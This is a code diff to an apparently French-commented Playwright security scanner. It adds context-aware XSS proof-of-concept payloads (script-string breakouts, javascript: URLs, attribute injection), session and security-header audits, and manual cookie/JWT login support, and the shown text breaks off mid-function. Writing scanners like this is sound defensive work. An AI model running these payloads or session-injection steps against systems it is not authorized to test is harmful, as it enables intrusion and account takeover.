@@ -30,6 +30,9 @@ import asyncio
 import base64
 import logging
 import re
+import threading
+import time
+import uuid
 from dataclasses import dataclass, field, asdict
 from typing import Any
 from urllib.parse import urljoin, urlparse, urldefrag, quote
@@ -84,6 +87,18 @@ class CrawlResult:
     # scans DAST authentifiés (ex : DalFox en POST sur un formulaire qui
     # exige une session) sur des pages sinon inaccessibles anonymement.
     auth_token: str = ""
+    # Audit de sécurité de la session établie (voir _analyze_session) :
+    # attributs des cookies (HttpOnly/Secure/SameSite), jeton exposé en
+    # localStorage... Distinct des vulnérabilités XSS : ce n'est pas une
+    # injection trouvée, mais ce qui détermine l'IMPACT d'un XSS trouvé
+    # ailleurs (un cookie de session sans HttpOnly, ou un jeton en
+    # localStorage, transforme n'importe quel XSS en vol de session trivial).
+    session_analysis: dict[str, Any] = field(default_factory=dict)
+    # Audit des en-têtes de sécurité HTTP (CSP, X-Frame-Options, HSTS...)
+    # de la réponse principale — voir _analyze_security_headers. Distinct
+    # des vulnérabilités XSS : détermine si le navigateur a un filet de
+    # sécurité (CSP notamment) même si une injection XSS est trouvée.
+    security_headers: dict[str, Any] = field(default_factory=dict)
 
     def to_dict(self) -> dict[str, Any]:
         return asdict(self)
@@ -184,7 +199,141 @@ DOM_XSS_PAYLOADS = [
     'api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&'
     'hide_related=false&show_comments=true&show_user=true&show_reposts=false&'
     'show_teaser=true"></iframe><script>alert(`xss-poc`)</script>',
+    # Évasion de contexte JS-string (payload atterrissant à l'intérieur
+    # d'une chaîne JS déjà entre guillemets, ex : var q = "REFLECTED";).
+    "';alert(`xss-poc`);//",
+    '";alert(`xss-poc`);//',
+    "</script><script>alert(`xss-poc`)</script>",
+    # Contexte URL (atterrit dans un attribut href/src déjà entre guillemets,
+    # sans échappement de balise nécessaire).
+    "javascript:alert(`xss-poc`)",
+    # Injection d'attribut SANS échappement de guillemet (cas où la valeur
+    # atterrit non échappée dans un attribut non fermé/mal filtré).
+    'onmouseover=alert(`xss-poc`) autofocus x=',
 ]
+
+# --------------------------------------------------------------------------
+# Sous-ensembles de DOM_XSS_PAYLOADS les plus efficaces selon le contexte de
+# réflexion détecté par `_detect_reflection_context` (marqueur unique
+# injecté puis localisé dans le HTML rendu). Utilisés pour RÉORDONNER le
+# corpus avant de le tester — jamais pour le réduire : le budget complet
+# reste tenté dans tous les cas, seul l'ordre change (les payloads les plus
+# probables d'après le contexte passent en premier, ce qui confirme une
+# vulnérabilité plus tôt dans le budget au lieu de tester des payloads hors
+# contexte avant d'arriver aux bons).
+PAYLOAD_CONTEXTS: dict[str, list[str]] = {
+    "html": [
+        p for p in DOM_XSS_PAYLOADS
+        if p.lstrip().startswith("<") and not p.lstrip().startswith(("\"", "'"))
+    ],
+    "attribute": [
+        '"><script>alert(`xss-poc`)</script>',
+        "'><svg onload=alert(`xss-poc`)>",
+        'onmouseover=alert(`xss-poc`) autofocus x=',
+        '<img src=x onerror=alert(`xss-poc`)>',
+    ],
+    "script": [
+        "';alert(`xss-poc`);//",
+        '";alert(`xss-poc`);//',
+        "</script><script>alert(`xss-poc`)</script>",
+    ],
+    "url": [
+        "javascript:alert(`xss-poc`)",
+        '<iframe src="javascript:alert(`xss-poc`)">',
+    ],
+}
+
+
+def _ordered_payloads_for_context(context: str) -> list[str]:
+    """
+    Renvoie DOM_XSS_PAYLOADS réordonné : les payloads adaptés au contexte de
+    réflexion détecté en premier, suivis du reste du corpus dans son ordre
+    d'origine. La couverture ne change pas (aucun payload retiré) — seul
+    l'ordre de test change.
+    """
+    preferred = PAYLOAD_CONTEXTS.get(context, [])
+    preferred_set = set(preferred)
+    rest = [p for p in DOM_XSS_PAYLOADS if p not in preferred_set]
+    return preferred + rest
+
+
+# Sous-ensemble de DOM_XSS_PAYLOADS utilisable comme valeur d'en-tête HTTP
+# (voir _probe_header_xss) : exclut tout payload contenant un retour à la
+# ligne (déjà absent du corpus, exclu explicitement par sécurité — un CRLF
+# dans une valeur d'en-tête casserait la requête). Borné à un sous-ensemble
+# efficace car chaque essai coûte un contexte navigateur complet.
+HEADER_XSS_PAYLOADS = [p for p in DOM_XSS_PAYLOADS if "\n" not in p and "\r" not in p][:8]
+
+
+def _parse_csp(header_value: str) -> dict[str, list[str]]:
+    """Parse un en-tête Content-Security-Policy en {directive: [sources]}."""
+    directives: dict[str, list[str]] = {}
+    for part in header_value.split(";"):
+        part = part.strip()
+        if not part:
+            continue
+        tokens = part.split()
+        if not tokens:
+            continue
+        directives[tokens[0].lower()] = tokens[1:]
+    return directives
+
+
+def _names_look_session_like(names: set[str]) -> bool:
+    """Un nom de cookie/clé localStorage évoque une session (utilisé comme
+    signal de secours par _verify_logged_in_generic quand aucun indice
+    textuel de déconnexion n'est trouvé sur la page)."""
+    return any(
+        kw in name.lower()
+        for name in names
+        for kw in ("session", "auth", "token", "sid", "jwt")
+    )
+
+
+# Indices textuels/structurels de déconnexion, utilisés par la vérification
+# de connexion générique (site quelconque, sans sélecteur fixe connu — voir
+# _verify_logged_in_generic). Couvre plusieurs formulations et l'attribut
+# href/aria-label en plus du texte visible.
+_LOGOUT_HINT_SELECTORS = (
+    "a:has-text('Log out')", "a:has-text('Sign out')", "a:has-text('Logout')",
+    "a:has-text('Sign Out')", "a:has-text('Log Out')",
+    "button:has-text('Log out')", "button:has-text('Sign out')",
+    "button:has-text('Logout')",
+    # Volontairement PAS de mots seuls trop génériques ("Exit", "Disconnect") :
+    # constaté en pratique — le bouton LOGIN de Juice Shop utilise l'icône
+    # Material "exit_to_app" (icône générique "porte de sortie", réutilisée
+    # pour login ET logout dans Material Design), dont le texte de ligature
+    # contient littéralement "exit" et matchait à tort `has-text('Exit')`
+    # comme preuve de déconnexion. "Disconnect" a le même risque avec les
+    # boutons "Disconnect wallet" des dApps Web3. On ne garde que des
+    # expressions complètes (2+ mots) ou des attributs href/aria-label
+    # contenant le mot complet "logout"/"sign out", nettement moins ambigus.
+    "[href*='logout' i]", "[href*='signout' i]", "[href*='sign-out' i]",
+    "[aria-label*='log out' i]", "[aria-label*='sign out' i]",
+)
+
+# Segments de chemin (correspondance EXACTE d'un segment entier, pas une
+# sous-chaîne) évoquant un endpoint "utilisateur courant" — voir
+# _inspect_session_bootstrap_response. Volontairement étroit : des préfixes
+# génériques comme "api"/"rest" matcheraient presque tout sur une SPA
+# quelconque (constaté sur Juice Shop, voir le commentaire de la méthode).
+_SESSION_CHECK_URL_SEGMENTS = {
+    "me", "whoami", "who-am-i", "current-user", "currentuser",
+    "session", "profile", "account", "userinfo", "user-info",
+}
+
+# Bascules de menu compte/avatar courantes : beaucoup de sites cachent leur
+# lien "Log out" derrière l'un de ces éléments (menu déroulant à rendu
+# paresseux) — voir _verify_logged_in_generic, qui essaie de les ouvrir
+# avant d'abandonner. Même principe que le bug corrigé pour Juice Shop
+# (voir _verify_logged_in), généralisé à un site quelconque.
+_MENU_TOGGLE_SELECTORS = (
+    "[aria-label*='account' i]", "[aria-label*='profile' i]",
+    "[aria-label*='user menu' i]", "[aria-label*='my account' i]",
+    "[class*='avatar' i]", "[class*='user-menu' i]",
+    "[class*='account-menu' i]", "[data-testid*='account' i]",
+    "[data-testid*='user-menu' i]",
+)
 
 # --------------------------------------------------------------------------
 # Identifiants d'un compte jetable créé pour explorer les pages nécessitant
@@ -196,6 +345,36 @@ def _random_credentials() -> tuple[str, str]:
 
     suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
     return f"scanner_{suffix}@example.test", f"Sc4nner!{suffix}"
+
+
+def _short_reason(exc: Exception) -> str:
+    """
+    Réduit une exception Playwright à sa première ligne : les timeouts
+    d'actionabilité embarquent un `Call log` de dizaines de lignes (voir les
+    retries de `_try_register_and_login`), illisible et hors-sujet une fois
+    affiché dans le rapport utilisateur — on ne garde que le message utile.
+    """
+    text = str(exc).strip()
+    first_line = text.splitlines()[0] if text else type(exc).__name__
+    return first_line[:160]
+
+
+def _parse_cookie_string(raw: str) -> list[tuple[str, str]]:
+    """
+    Parse un cookie fourni manuellement dans l'UI, format `Cookie:` HTTP
+    standard ("name=value; name2=value2") — le format qu'on copie-colle
+    directement depuis les devtools du navigateur.
+    """
+    pairs: list[tuple[str, str]] = []
+    for part in raw.split(";"):
+        part = part.strip()
+        if not part or "=" not in part:
+            continue
+        name, _, value = part.partition("=")
+        name = name.strip()
+        if name:
+            pairs.append((name, value.strip()))
+    return pairs
 
 
 # Résout une expression arithmétique simple ("7*3-4") comme celles utilisées
@@ -298,11 +477,32 @@ class PlaywrightCrawler:
         max_pages: int | None = None,
         max_depth: int | None = None,
         headless: bool | None = None,
+        stop_event: threading.Event | None = None,
+        dom_probe_budget: int = 60,
+        reflected_probe_budget: int = 30,
+        form_probe_budget: int = 30,
+        header_probe_budget: int = 12,
+        auth_cookie: str | None = None,
+        auth_jwt: str | None = None,
+        auth_username: str | None = None,
+        auth_password: str | None = None,
     ) -> None:
         self.target = target.rstrip("/")
         self.max_pages = max_pages or config.CRAWLER_MAX_PAGES
         self.max_depth = max_depth or config.CRAWLER_MAX_DEPTH
         self.headless = config.CRAWLER_HEADLESS if headless is None else headless
+        # Authentification manuelle fournie par l'utilisateur (UI) : permet
+        # de scanner avec une VRAIE session/compte plutôt que le compte
+        # jetable auto-généré par _register_and_login(). Priorité (voir
+        # run()) : cookie/JWT fournis > identifiants fournis > auto.
+        self.auth_cookie = auth_cookie or None
+        self.auth_jwt = auth_jwt or None
+        self.auth_username = auth_username or None
+        self.auth_password = auth_password or None
+        # Vérifié entre chaque page du BFS (voir run()) : permet au bouton
+        # "Pause" de l'UI d'interrompre le crawl avant la page suivante au
+        # lieu d'attendre la fin des self.max_pages pages.
+        self.stop_event = stop_event
 
         self.origin = self._origin(self.target)
         self.result = CrawlResult(target=self.target)
@@ -316,14 +516,24 @@ class PlaywrightCrawler:
         # global d'essais pour couvrir plusieurs pages/champs sans spammer
         # la cible ni ralentir excessivement le crawl.
         self._dialog_fired = False
-        # Budgets relevés pour couvrir tout le corpus DOM_XSS_PAYLOADS (~20
-        # payloads) sur plusieurs champs/pages, au lieu de s'arrêter au
-        # premier payload qui fonctionne (voir _probe_dom_xss/_probe_
-        # reflected_xss/_probe_persisted_forms) — demande explicite : tester
-        # large plutôt qu'un seul payload par point d'injection.
-        self._dom_probe_budget = 60
-        self._form_probe_budget = 30
-        self._reflected_probe_budget = 30
+        # Budgets réglés par le niveau de scan choisi dans l'UI (voir
+        # config.SCAN_LEVELS) pour couvrir tout ou partie du corpus
+        # DOM_XSS_PAYLOADS (~20 payloads) sur plusieurs champs/pages, au lieu
+        # de s'arrêter au premier payload qui fonctionne (voir _probe_dom_xss
+        # /_probe_reflected_xss/_probe_persisted_forms).
+        self._dom_probe_budget = dom_probe_budget
+        self._form_probe_budget = form_probe_budget
+        self._reflected_probe_budget = reflected_probe_budget
+        # Sondage XSS via en-têtes HTTP réfléchis (voir _probe_header_xss) :
+        # budget séparé car chaque essai ouvre un nouveau contexte navigateur
+        # (coûteux), contrairement aux sondages ci-dessus qui réutilisent la
+        # même page.
+        self._header_probe_budget = header_probe_budget
+        # Ne vérifier les en-têtes de sécurité (CSP...) qu'une fois, sur la
+        # toute première page — ils sont généralement identiques sur tout le
+        # site (même serveur/configuration), pas besoin de le refaire à
+        # chaque page (voir run()).
+        self._headers_checked = False
         # Compte jetable créé via _register_and_login() : de nombreuses pages
         # (profil, feedback avec auteur pré-rempli, menu compte...) ne sont
         # accessibles/pertinentes qu'après authentification et sont sinon
@@ -331,6 +541,14 @@ class PlaywrightCrawler:
         self._login_email, self._login_password = _random_credentials()
         self._logged_in = False
         self._finding_keys: set[tuple[str, str, str, str]] = set()
+
+    def _paused(self) -> bool:
+        """Pause demandée par l'utilisateur (voir stop_event) : vérifié dans
+        les boucles à budget (_probe_dom_xss/_probe_reflected_xss/
+        _probe_persisted_forms) et le retry de login, en plus de la boucle
+        BFS de run() — une seule page peut sinon consommer plus d'une minute
+        de sondage avant que la pause ne soit honorée."""
+        return bool(self.stop_event and self.stop_event.is_set())
 
     async def _on_dialog(self, dialog) -> None:
         """Capture le déclenchement d'un dialogue JS (preuve d'exécution XSS)."""
@@ -498,6 +716,559 @@ class PlaywrightCrawler:
         except PWTimeout:
             await page.goto(url, timeout=config.CRAWLER_PAGE_TIMEOUT_MS, wait_until="domcontentloaded")
 
+    async def _verify_logged_in(self, page: Page, timeout: int = 5000) -> bool:
+        """
+        Preuve fiable d'une session authentifiée active.
+
+        `#navbarLogoutButton` n'existe dans le DOM qu'une fois le menu
+        compte ouvert (mat-menu à rendu paresseux : son contenu n'est monté
+        qu'à l'ouverture), ET seulement si une session est active. Le bouton
+        bascule du menu (aria-label="Show/hide account menu"), lui, est
+        TOUJOURS présent — connecté ou non — et donnerait un FAUX POSITIF
+        s'il était utilisé seul comme preuve de connexion (bug constaté :
+        un login avec un mauvais mot de passe se rapportait "connecté").
+        """
+        try:
+            toggle = await page.query_selector(
+                "button[aria-label='Show/hide account menu']"
+            )
+            if toggle:
+                await toggle.click(timeout=2000, force=True)
+                await page.wait_for_timeout(300)
+            await page.wait_for_selector("#navbarLogoutButton", timeout=timeout)
+            return True
+        except Exception:
+            return False
+        finally:
+            # Referme le menu qu'on vient d'ouvrir : le laisser ouvert
+            # gênerait les interactions de la page suivante (le backdrop du
+            # dropdown intercepterait leurs clics, même après un changement
+            # de route Angular côté client).
+            try:
+                await page.keyboard.press("Escape")
+                await page.wait_for_timeout(150)
+            except Exception:
+                pass
+
+    async def _has_logout_hint(self, page: Page) -> bool:
+        """Cherche un indice textuel/structurel de déconnexion (voir
+        _verify_logged_in_generic) — factorisé pour être réessayé après
+        avoir ouvert un menu compte/avatar potentiellement caché."""
+        for sel in _LOGOUT_HINT_SELECTORS:
+            try:
+                if await page.query_selector(sel):
+                    return True
+            except Exception:
+                continue
+        return False
+
+    async def _verify_logged_in_generic(
+        self, page: Page, timeout: int = 5000,
+        cookies_before: set[str] | None = None,
+        storage_before: set[str] | None = None,
+    ) -> bool:
+        """
+        Heuristique de connexion générique, pour un site quelconque où
+        `#navbarLogoutButton` (spécifique Juice Shop) n'existe pas. Moins
+        fiable que `_verify_logged_in` — best-effort, toujours accompagné
+        d'une note explicite dans le rapport en cas d'échec (voir
+        _try_login_generic / _apply_manual_session).
+
+        Quatre signaux combinés, aucun n'étant fiable seul sur un site
+        quelconque :
+          1. Le champ mot de passe a disparu (navigation hors du formulaire).
+          2. Un indice de déconnexion est visible ("Log out" et variantes) —
+             y compris en essayant d'ouvrir un menu compte/avatar d'abord,
+             car beaucoup de sites le cachent dans un menu déroulant à rendu
+             paresseux (même piège que Juice Shop, voir _verify_logged_in :
+             c'est précisément le bug corrigé là-bas).
+          3. (si `cookies_before` fourni) Un NOUVEAU cookie au nom évocateur
+             d'une session (session/auth/token/sid/jwt) est apparu depuis.
+          4. (si `storage_before` fourni) Une NOUVELLE clé localStorage au
+             nom évocateur d'un jeton est apparue — le schéma exact de ce
+             framework (JWT en localStorage plutôt qu'en cookie, voir
+             _analyze_session) est extrêmement répandu sur les SPA
+             modernes (React/Vue/Angular), pas seulement Juice Shop.
+        """
+        deadline = time.monotonic() + timeout / 1000
+        menu_tried = False
+        while time.monotonic() < deadline:
+            pwd_gone = (await page.query_selector("input[type='password']")) is None
+            logout_hint = await self._has_logout_hint(page)
+
+            if not logout_hint and not menu_tried:
+                # Une seule tentative d'ouverture de menu (pas à chaque
+                # itération de la boucle) pour ne pas s'acharner dessus.
+                menu_tried = True
+                for sel in _MENU_TOGGLE_SELECTORS:
+                    try:
+                        el = await page.query_selector(sel)
+                        if el and await el.is_visible():
+                            await el.click(timeout=1000, force=True)
+                            await page.wait_for_timeout(300)
+                            if await self._has_logout_hint(page):
+                                logout_hint = True
+                                break
+                    except Exception:
+                        continue
+
+            if pwd_gone and logout_hint:
+                return True
+
+            # Les signaux cookie/localStorage ci-dessous ne sont PAS
+            # subordonnés à pwd_gone : un jeton de session qui apparaît
+            # (absent avant la soumission, présent après) est une preuve
+            # directe en soi, que la page ait ou non visuellement changé —
+            # certains sites ne masquent/retirent pas le formulaire de
+            # connexion après authentification (ex : formulaire encore
+            # présent mais désactivé, ou simplement jamais retiré du DOM).
+            if cookies_before is not None:
+                try:
+                    after = {c["name"] for c in await page.context.cookies()}
+                except Exception:
+                    after = set()
+                new_cookies = after - cookies_before
+                if _names_look_session_like(new_cookies):
+                    return True
+
+            if storage_before is not None:
+                try:
+                    keys_after = await page.evaluate(
+                        "() => Object.keys(window.localStorage || {})"
+                    )
+                except Exception:
+                    keys_after = []
+                new_keys = set(keys_after) - storage_before
+                if _names_look_session_like(new_keys):
+                    return True
+
+            await page.wait_for_timeout(300)
+        return False
+
+    async def _verify_logged_in_any(self, page: Page, timeout: int = 5000) -> bool:
+        """Essaie la vérification précise (Juice Shop) puis, à défaut, la
+        générique — utilisé quand la cible peut être un site quelconque
+        (session fournie manuellement via cookie/JWT, voir _apply_manual_session)."""
+        if await self._verify_logged_in(page, timeout=min(timeout, 3000)):
+            return True
+        return await self._verify_logged_in_generic(page, timeout=timeout)
+
+    async def _inspect_session_bootstrap_response(
+        self, response, signal: dict[str, bool],
+    ) -> None:
+        """
+        Inspecte les réponses réseau qui suivent l'application d'une
+        session manuelle (cookie/JWT) — voir `_apply_manual_session`.
+
+        Contrairement à `_inspect_login_response` (qui cherche un jeton
+        dans la réponse d'une SOUMISSION de formulaire), ici il n'y a pas
+        de soumission : le signal recherché est que l'app ait VALIDÉ la
+        session déjà fournie — typiquement un appel "utilisateur courant"
+        au démarrage. Un 401/403 est une preuve fiable de rejet.
+
+        Pour le succès, on exige une correspondance EXACTE d'un segment
+        entier du chemin (ex : "/me", "/api/whoami") — PAS une simple
+        sous-chaîne sur des préfixes génériques comme "/api/"/"/rest/" :
+        constaté en pratique sur Juice Shop, où /rest/admin/application-
+        version, /rest/languages ou /api/Challenges sont des endpoints
+        PUBLICS non authentifiés qui partagent pourtant ce préfixe avec les
+        endpoints réellement protégés — un simple `in` aurait (et a,
+        avant ce correctif) produit un faux positif systématique.
+        """
+        try:
+            req = response.request
+            if req.resource_type not in ("xhr", "fetch"):
+                return
+            log = signal.setdefault("log", [])
+            if len(log) < 15:  # borné : simple aide au diagnostic, pas un HAR complet
+                log.append(f"{req.method} {req.url} -> {response.status}")
+            if response.status in (401, 403):
+                signal["failed"] = True
+                return
+            if response.status < 300:
+                path = urlparse(req.url).path
+                segments = {seg.lower() for seg in path.split("/") if seg}
+                if segments & _SESSION_CHECK_URL_SEGMENTS:
+                    signal["success"] = True
+        except Exception:
+            pass
+
+    async def _capture_auth_debug_snapshot(
+        self, page: Page, network_signal: dict[str, Any] | None = None,
+    ) -> dict[str, Any]:
+        """
+        Capture un instantané de diagnostic quand la vérification de
+        connexion échoue — pour que l'échec soit CONSTATABLE dans le
+        rapport plutôt qu'une simple hypothèse à deviner à distance.
+        Montre exactement ce que le navigateur a vu : cookies présents,
+        clés localStorage présentes, URL finale, capture d'écran, et les
+        appels réseau observés (voir _inspect_login_response /
+        _inspect_session_bootstrap_response).
+        """
+        snapshot: dict[str, Any] = {}
+        try:
+            cookies = await page.context.cookies()
+            snapshot["cookies_present"] = sorted(c["name"] for c in cookies)
+        except Exception:
+            snapshot["cookies_present"] = []
+        try:
+            keys = await page.evaluate("() => Object.keys(window.localStorage || {})")
+            snapshot["local_storage_keys"] = sorted(keys)
+        except Exception:
+            snapshot["local_storage_keys"] = []
+        try:
+            snapshot["final_url"] = page.url
+        except Exception:
+            snapshot["final_url"] = ""
+        snapshot["network_log"] = (network_signal or {}).get("log", [])
+        snapshot["screenshot"] = await self._snap(
+            page, "Page state after the login attempt (verification did not confirm success)"
+        )
+        return snapshot
+
+    async def _apply_manual_session(self, page: Page) -> None:
+        """
+        Utilise une session fournie manuellement dans l'UI (cookie et/ou
+        JWT) au lieu du compte jetable auto-généré — utile pour scanner avec
+        une VRAIE session déjà authentifiée (ex : récupérée via les devtools
+        du navigateur) plutôt qu'un compte anonyme fraîchement créé.
+
+        Le cookie est posé sur le contexte AVANT toute navigation (comme le
+        ferait un navigateur qui rechargerait la page avec ce cookie déjà
+        présent) ; le JWT est écrit dans localStorage APRÈS une première
+        navigation vers l'origine, car localStorage est cloisonné par
+        origine — impossible d'y écrire tant qu'aucune page de ce domaine
+        n'a été chargée (on serait encore sur about:blank).
+        """
+        if self.auth_cookie:
+            for name, value in _parse_cookie_string(self.auth_cookie):
+                try:
+                    await page.context.add_cookies(
+                        [{"name": name, "value": value, "url": self.origin}]
+                    )
+                except Exception as exc:
+                    logger.warning("Cookie manuel '%s' rejeté : %s", name, exc)
+
+        # Écoute les appels API déclenchés par le rechargement qui suit :
+        # signal plus direct que deviner depuis l'état visuel de la page
+        # ensuite (voir _inspect_session_bootstrap_response).
+        network_signal = {"success": False, "failed": False}
+        response_handler = lambda resp: asyncio.ensure_future(
+            self._inspect_session_bootstrap_response(resp, network_signal)
+        )
+        page.on("response", response_handler)
+
+        try:
+            await self._goto_resilient(page, self.origin)
+            await page.wait_for_timeout(300)
+            await self._dismiss_overlays(page)
+        except Exception:
+            pass
+
+        if self.auth_jwt:
+            self.result.auth_token = self.auth_jwt
+            try:
+                await page.evaluate(
+                    "(t) => window.localStorage.setItem('token', t)", self.auth_jwt
+                )
+                # Recharge pour que l'app relise le token fraîchement écrit
+                # et mette à jour son état d'authentification (menu compte,
+                # etc.) — sans ça la vérification ci-dessous verrait
+                # toujours l'état "déconnecté" de la navigation précédente.
+                await self._goto_resilient(page, self.origin)
+                await page.wait_for_timeout(500)
+                await self._dismiss_overlays(page)
+            except Exception as exc:
+                logger.warning("Injection du JWT dans localStorage impossible : %s", exc)
+
+        # Laisse le temps aux appels API déclenchés par le rendu de la page
+        # de se terminer avant de couper l'écoute réseau.
+        await page.wait_for_timeout(500)
+        page.remove_listener("response", response_handler)
+
+        # Contrairement à _login_with_credentials, on ne peut pas déduire la
+        # réussite d'un clic "Connexion" : on combine donc la vérification
+        # visuelle (_verify_logged_in_any, Juice Shop + générique) avec le
+        # signal réseau ci-dessus — un 401/403 explicite prime sur tout
+        # signal visuel potentiellement trompeur.
+        dom_verified = await self._verify_logged_in_any(page, timeout=4000)
+        verified = (dom_verified or network_signal["success"]) and not network_signal["failed"]
+
+        self._logged_in = verified
+        logger.info(
+            "Session manuelle appliquée (cookie=%s, jwt=%s, vérifiée=%s)",
+            bool(self.auth_cookie), bool(self.auth_jwt), verified,
+        )
+        note = "" if verified else (
+            "The provided cookie/JWT was applied, but the target's UI did "
+            "not visibly confirm an authenticated session (no account menu "
+            "found) — the value may be invalid or expired, or this target "
+            "doesn't expose the same logged-in indicators as Juice Shop."
+        )
+        await self._analyze_session(
+            page, token_in_local_storage=bool(self.auth_jwt),
+            logged_in=verified, auth_mode="manual_cookie_jwt", note=note,
+        )
+        if not verified:
+            self.result.session_analysis["debug"] = await self._capture_auth_debug_snapshot(
+                page, network_signal
+            )
+
+    async def _login_with_credentials(self, page: Page, email: str, password: str) -> None:
+        """
+        Connexion avec des identifiants RÉELS fournis par l'utilisateur (au
+        lieu du compte jetable auto-généré par _register_and_login) — utile
+        pour scanner avec un compte de test existant. Pas de tentative
+        d'inscription ici : on suppose que le compte existe déjà.
+
+        Deux stratégies essayées dans l'ordre, pour fonctionner aussi bien
+        sur Juice Shop (la cible de démo) que sur un site quelconque dont
+        on ne connaît pas la structure HTML à l'avance :
+          1. Sélecteurs Juice Shop connus (rapide, précis).
+          2. Détection générique d'un formulaire de connexion (champ mot
+             de passe + champ identifiant le plus proche + bouton submit).
+        """
+        attempts: list[str] = []
+
+        try:
+            if await self._try_login_juiceshop_selectors(page, email, password):
+                self._logged_in = True
+                await self._finish_login_success(page, email, "manual_credentials")
+                return
+            attempts.append("no Juice Shop-style login form found")
+        except Exception as exc:
+            attempts.append(f"Juice Shop-style attempt: {_short_reason(exc)}")
+
+        try:
+            if await self._try_login_generic(page, email, password):
+                self._logged_in = True
+                await self._finish_login_success(page, email, "manual_credentials")
+                return
+            attempts.append("no login form (password field) found on this page")
+        except Exception as exc:
+            attempts.append(f"generic attempt: {_short_reason(exc)}")
+
+        reason = "; ".join(attempts)
+        logger.warning("Connexion avec les identifiants fournis a échoué : %s", reason)
+        self.result.session_analysis = {
+            "logged_in": False,
+            "auth_mode": "manual_credentials",
+            "cookies": [],
+            "token_in_local_storage": False,
+            "findings": [],
+            "note": (
+                f"Login with the provided username/password ({email}) did "
+                "not succeed — check that this account exists on the "
+                f"target and the password is correct. (Detail: {reason})"
+            ),
+        }
+        self.result.session_analysis["debug"] = await self._capture_auth_debug_snapshot(page)
+
+    async def _try_login_juiceshop_selectors(
+        self, page: Page, email: str, password: str
+    ) -> bool:
+        """
+        Tentative rapide avec les sélecteurs fixes de Juice Shop. Renvoie
+        `False` (sans lever) si le formulaire n'a pas cette structure —
+        auquel cas `_login_with_credentials` passe à la détection
+        générique plutôt que d'abandonner.
+        """
+        await self._goto_resilient(page, f"{self.origin}/#/login")
+        await page.wait_for_timeout(500)
+        await self._dismiss_overlays(page)
+        try:
+            await page.wait_for_selector("#email", timeout=3000)
+        except Exception:
+            return False  # pas un formulaire Juice Shop -> tentative générique
+
+        await page.fill("#email", email)
+        await page.fill("#password", password)
+        await page.click("#loginButton", timeout=5000)
+        await page.wait_for_timeout(1200)
+        if not await self._verify_logged_in(page, timeout=5000):
+            raise RuntimeError(
+                "Login form submitted but no authenticated session was "
+                "detected afterwards (wrong password or account does not "
+                "exist on this target)."
+            )
+        return True
+
+    async def _inspect_login_response(self, response, signal: dict[str, bool]) -> None:
+        """
+        Inspecte une réponse réseau survenue pendant `_try_login_generic`
+        pour y chercher le verdict de l'API de connexion elle-même — le
+        signal le plus direct possible, plutôt qu'une déduction depuis
+        l'état du DOM ensuite (voir _try_login_generic).
+
+        - Statut 401/403 sur un appel XHR/fetch : échec explicite, quel que
+          soit ce que montre la page ensuite.
+        - Corps JSON/texte contenant une clé de jeton typique
+          (token/access_token/jwt/authToken/sessionId) : succès — la
+          quasi-totalité des API de connexion renvoient soit ça, soit un
+          cookie de session (déjà couvert par `cookies_before` dans
+          `_verify_logged_in_generic`).
+        """
+        try:
+            req = response.request
+            if req.resource_type not in ("xhr", "fetch", "document"):
+                return
+            if response.status in (401, 403):
+                signal["failed"] = True
+                return
+            if response.status >= 400:
+                return
+            headers = response.headers or {}
+            ctype = headers.get("content-type", "")
+            if "json" not in ctype and "text" not in ctype:
+                return
+            body = (await response.text()).lower()
+            if any(
+                kw in body for kw in
+                ('"token"', '"access_token"', '"accesstoken"', '"jwt"',
+                 '"authtoken"', '"sessionid"', '"session_id"')
+            ):
+                signal["success"] = True
+        except Exception:
+            pass
+
+    async def _try_login_generic(self, page: Page, email: str, password: str) -> bool:
+        """
+        Détection générique d'un formulaire de connexion, pour un site dont
+        la structure HTML n'est pas connue à l'avance : repère un champ mot
+        de passe (sélecteur quasi universel, `type="password"`), remonte au
+        champ identifiant le plus proche dans le même `<form>`, et soumet
+        via le bouton le plus probable. Moins fiable que les sélecteurs
+        dédiés Juice Shop (voir `_verify_logged_in_generic`), mais permet de
+        scanner un site quelconque plutôt que seulement la cible de démo.
+        """
+        await self._goto_resilient(page, self.target)
+        await page.wait_for_timeout(500)
+        await self._dismiss_overlays(page)
+
+        pwd_field = await page.query_selector("input[type='password']")
+        if not pwd_field:
+            # Le formulaire est peut-être caché derrière un lien "Log in" /
+            # "Sign in" plutôt que visible directement sur la page cible.
+            for sel in (
+                "a:has-text('Log in')", "a:has-text('Sign in')", "a:has-text('Login')",
+                "button:has-text('Log in')", "button:has-text('Sign in')",
+                "a[href*='login' i]", "a[href*='signin' i]", "a[href*='sign-in' i]",
+            ):
+                try:
+                    el = await page.query_selector(sel)
+                    if el and await el.is_visible():
+                        await el.click(timeout=2000, force=True)
+                        await page.wait_for_timeout(800)
+                        break
+                except Exception:
+                    continue
+            pwd_field = await page.query_selector("input[type='password']")
+
+        if not pwd_field:
+            return False  # aucun formulaire de connexion détectable
+
+        user_handle = await page.evaluate_handle(
+            """(pwd) => {
+                const form = pwd.closest('form') || document;
+                const sel = 'input[type="email"], input[autocomplete="username"], ' +
+                    'input[autocomplete="email"], input[name*="email" i], ' +
+                    'input[name*="user" i], input[id*="email" i], input[id*="user" i], ' +
+                    'input[type="text"]';
+                const candidates = [...form.querySelectorAll(sel)];
+                return candidates.find(el => el.offsetParent !== null) || candidates[0] || null;
+            }""",
+            pwd_field,
+        )
+        user_el = user_handle.as_element()
+        if not user_el:
+            raise RuntimeError(
+                "Password field found, but no username/email field near it."
+            )
+
+        # Capturés AVANT la soumission : un nouveau cookie/clé localStorage
+        # au nom évocateur d'une session apparu APRÈS est un signal de
+        # secours pour _verify_logged_in_generic quand aucun indice textuel
+        # de déconnexion n'est détectable sur ce site (voir cette méthode).
+        try:
+            cookies_before = {c["name"] for c in await page.context.cookies()}
+        except Exception:
+            cookies_before = set()
+        try:
+            storage_before = set(
+                await page.evaluate("() => Object.keys(window.localStorage || {})")
+            )
+        except Exception:
+            storage_before = set()
+
+        # Signal le plus direct de tous : ce que l'API de connexion elle-même
+        # répond — plutôt que de deviner depuis l'état du DOM ensuite. La
+        # quasi-totalité des flux de connexion web renvoient soit un cookie
+        # de session (Set-Cookie, déjà couvert par cookies_before), soit un
+        # jeton dans le corps JSON de la réponse (consommé par le JS du
+        # site puis stocké en local/sessionStorage) ; un 401/403 explicite
+        # est à l'inverse une preuve fiable d'échec, quel que soit l'état du
+        # DOM ensuite (qui peut prêter à confusion sur une SPA).
+        network_signal = {"success": False, "failed": False}
+        response_handler = lambda resp: asyncio.ensure_future(
+            self._inspect_login_response(resp, network_signal)
+        )
